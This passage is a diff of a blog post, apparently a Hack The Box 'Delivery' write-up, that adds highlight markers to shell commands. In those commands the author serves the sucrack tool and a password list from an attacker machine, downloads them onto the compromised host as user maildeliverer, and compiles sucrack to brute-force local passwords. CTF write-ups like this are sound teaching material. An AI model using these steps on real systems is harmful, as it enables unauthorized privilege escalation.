@@ -30,13 +30,13 @@ If we click the "Helpdesk" link, we are informed by the browser that the website
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ echo -n '10.10.10.222\tdelivery.htb\n10.10.10.222\thelpdesk.delivery.htb' | sudo tee -a /etc/hosts
+└─$ @@echo -n '10.10.10.222\tdelivery.htb\n10.10.10.222\thelpdesk.delivery.htb' | sudo tee -a /etc/hosts@@
 [...]
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ cat /etc/hosts 
+└─$ @@cat /etc/hosts@@
 [...]
 10.10.10.222    delivery.htb
-10.10.10.222    helpdesk.delivery.htb
+@@@10.10.10.222    helpdesk.delivery.htb@@@
 
 ┌──(kali㉿kali)-[/tmp/x]
 └─$
@@ -104,25 +104,25 @@ We can download the sucrack project from its [Github repository](https://github.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ wget https://github.com/hemp3l/sucrack/archive/refs/heads/master.zip -O sucrack.zip
+└─$ @@wget https://github.com/hemp3l/sucrack/archive/refs/heads/master.zip -O sucrack.zip@@
 [...]
 2021-12-01 14:20:38 (744 KB/s) - ‘sucrack.zip’ saved [164375]
 
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ sudo python3 -m http.server 80
+└─$ @@sudo python3 -m http.server 80@@
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 {% endhighlight %}
 
 {% highlight none linenos %}
-maildeliverer@Delivery:~$ wget http://10.10.16.3/sucrack.zip
+maildeliverer@Delivery:~$ @@wget http://10.10.16.3/sucrack.zip@@
 [...]
 2021-12-01 08:23:12 (599 KB/s) - ‘sucrack.zip’ saved [164375/164375]
 
-maildeliverer@Delivery:~$ wget http://10.10.16.3/passwords
+maildeliverer@Delivery:~$ @@wget http://10.10.16.3/passwords@@
 [...]
 2021-12-01 08:31:00 (262 MB/s) - ‘passwords’ saved [1177/1177]
 
-maildeliverer@Delivery:~$ unzip sucrack.zip
+maildeliverer@Delivery:~$ @@unzip sucrack.zip@@
 Archive:  sucrack.zip
 c738b9a6d78b6aa517767d7621480a3f3dfb4dd6
    creating: sucrack-master/
@@ -130,14 +130,14 @@ c738b9a6d78b6aa517767d7621480a3f3dfb4dd6
   inflating: sucrack-master/ChangeLog  
 [...] 
   inflating: sucrack-master/src/worker.h
-maildeliverer@Delivery:~$ cd sucrack-master/
+maildeliverer@Delivery:~$ @@cd sucrack-master/@@
 maildeliverer@Delivery:~/sucrack-master$
 {% endhighlight %}
 
 Next, we compile sucrack by executing `./configure` and `make` as explained in the `README.md` file of the Github repository. This results in a binary named "sucrack" being created in the `src` directory.
 
 {% highlight none linenos %}
-maildeliverer@Delivery:~/sucrack-master$ ./configure
+maildeliverer@Delivery:~/sucrack-master$ @@./configure@@
 checking for a BSD-compatible install... /usr/bin/install -c
 checking whether build environment is sane... yes
 [...]
@@ -150,7 +150,7 @@ target system           : LINUX
 sucrack link flags      : -pthread
 sucrack compile flags   : -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
 
-maildeliverer@Delivery:~/sucrack-master$ make
+maildeliverer@Delivery:~/sucrack-master$ @@make@@
 make  all-recursive
 make[1]: Entering directory '/home/maildeliverer/sucrack-master'
 [...]
